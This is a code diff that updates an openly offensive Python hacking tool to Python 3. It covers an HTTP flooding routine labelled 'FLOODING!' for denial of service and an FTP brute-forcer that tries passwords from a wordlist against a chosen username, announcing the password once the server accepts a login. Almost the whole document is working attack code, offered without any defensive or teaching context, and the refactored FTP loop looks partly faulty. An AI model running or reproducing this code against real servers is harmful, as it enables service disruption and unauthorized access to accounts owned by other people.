@@ -57,9 +57,9 @@ def dos(host):
             print("Unable To Connect. Retrying.")
             continue
         print("[*]FLOODING!")
-        s.send("GET / HTTP/1.1\r\n")
-        s.send("Host: "+host+"\r\n")
-        s.send("User-Agent: "+choice(user_agents)+"\r\n\r\n")
+        s.send("GET / HTTP/1.1\r\n".encode())
+        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
+        s.send("User-Agent: ".encode()+choice(user_agents).encode()+"\r\n\r\n".encode())
         s.close()
 
 
@@ -119,10 +119,10 @@ def banner(host):
         print(e)
 
 
-def ask_file(title):
+def ask_file():
     while 1:
         path = Path(input(
-            f"Enter the {title} file name (eg: pass.txt, wordlist.txt)\n>"))
+            f"Enter the file name (eg: pass.txt, wordlist.txt)\n>"))
         if not path.is_file():
             print('[!] No such file!')
             continue
@@ -137,31 +137,29 @@ def ftp(server):
     username = input("Enter the username to hack(eg: admin, root): ")
 
     server = socket.gethostbyname(server)
-
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except:
+        return print("Unable to create Socket.")
+    try:
+        s.connect((server, 21))
+    except:
+        return print("Unable To Connect.")
+    data = s.recv(1024)
     for password in passwords:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except:
-            return print("Unable to create Socket.")
-        try:
-            s.connect((server, 21))
-        except:
-            return print("Unable To Connect.")
+        s.send('USER '.encode() + username.encode() + '\r\n'.encode())
         data = s.recv(1024)
-        s.send('USER ' + username + '\r\n')
-        data = s.recv(1024)
-        s.send('PASS ' + password+'\r\n')
+        s.send('PASS '.encode() + password.encode()+'\r\n'.encode())
+        data = s.recv(1024).decode()
         print(data)
-        data += " "+s.recv(1024)
-        data += " "+s.recv(1024)
-        s.send("Quit\r\n")
-        s.close
         print("[*] Tried: "+password+"\n")
         if "230" in data:
             print("password found\n")
             return print("[*] Password is: " + password)
         else:
             print('[*] '+password+" is incorrect")
+    s.send("Quit\r\n".encode())
+    s.close
     print("No password Found. Try another word list or username.")
 
 
